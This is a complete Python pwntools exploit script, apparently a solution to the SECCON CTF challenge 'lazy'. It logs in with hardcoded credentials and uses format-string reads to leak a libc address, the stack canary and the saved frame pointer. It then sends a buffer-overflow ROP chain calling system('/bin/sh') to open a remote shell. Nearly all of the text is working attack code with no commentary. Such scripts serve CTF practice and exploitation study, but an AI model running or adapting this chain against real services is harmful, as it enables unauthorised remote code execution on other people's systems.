#!/usr/bin/python2
from pwn import *
from pwn import u32, u64, p32, p64
from fs_lib import *
import sys

LOCAL = True
WAIT = False
PRELOAD = False
SHOULD_ELF = True
STRACE = False
LTRACE = False
if "remote" in sys.argv:
    LOCAL = False
elif "wait" in sys.argv:
    WAIT = True
if "preload" in sys.argv:
    PRELOAD = True
if "noelf" in sys.argv:
    SHOULD_ELF = False
if "strace" in sys.argv:
    STRACE = True
if "ltrace" in sys.argv:
    LTRACE = True

elf = None
libc = None


def get_conn():
    global elf  # pylint: disable=global-statement
    global libc  # pylint: disable=global-statement

    if SHOULD_ELF:
        elf = ELF(PROG_NAME)
        if LIBC_NAME != '':
            libc = ELF(LIBC_NAME)

    if LOCAL:
        env = os.environ.copy()
        env["DEBUG"] = "1"
        if LIBC_NAME and PRELOAD:
            env["LD_PRELOAD"] = LIBC_NAME
            log.info("LD_PRELOAD = %s" % env)
        cmd = []
        if STRACE:
            cmd.append("strace")
        elif LTRACE:
            cmd.append("ltrace")
        cmd.append(PROG_NAME)
        s = process(cmd, env=env)
        if WAIT:
            pause()
    else:
        s = remote(HOST, PORT)
    return s

# =================
# The exploit
context.clear(log_level='info', arch="amd64", kernel='amd64', os='linux')

PROG_NAME = "./lazy"
LIBC_NAME = ""
HOST = "lazy.chal.seccon.jp"
PORT = 33333


def go():
    s = get_conn()
    username = "_H4CK3R_"
    password = "3XPL01717"
    
    system_off = 0x3F570
    malloc_off = 0x78560
    pop_rdi = 0x4015f3
    bin_sh_off = 0x163c38

    # 0x00000000004015f3 : pop rdi ; ret

    s.sendline("2")
    s.sendline(username)
    s.sendline(password)
    s.sendline("4")

    leak_fmt = "%7$sAAAA"
    leak_fmt += p64(elf.got["malloc"])
    s.sendline(leak_fmt)
    s.recvuntil("Filename : ")
    
    leak = u64(s.recv(6).ljust(8, "\x00"))
    libc_base = leak - malloc_off
    system = libc_base + system_off
    bin_sh = libc_base + bin_sh_off

    log.info("leak {}".format(hex(leak)))
    log.info("libc base  @ {}".format(hex(libc_base)))
    log.info("system     @ {}".format(hex(system)))
    log.info("/bin/sh    @ {}".format(hex(bin_sh)))

    s.sendline("4")
    leak_fmt = "%9$llx"

    s.sendline(leak_fmt)
    s.recvuntil("Filename : ")
    cookie = int(s.recvline().strip(), 16)

    log.info("stack cookie = {}".format(hex(cookie)))

    s.sendline("4")
    leak_fmt = "%10$llx"

    s.sendline(leak_fmt)
    s.recvuntil("Filename : ")
    saved_ebp = int(s.recvline().strip(), 16)
    log.info("saved_ebp = {}".format(hex(saved_ebp)))
    
    
    s.sendline("4")
    # AA so it doesn't crash on download
    padding = "AA" + "\x00"*0x16
    payload = padding + p64(cookie) + p64(saved_ebp) + p64(pop_rdi) + p64(bin_sh) + p64(system)

    s.recvuntil("Input file name")
    s.sendline(payload)
    s.recvuntil("No such file!")

    s.interactive()

go()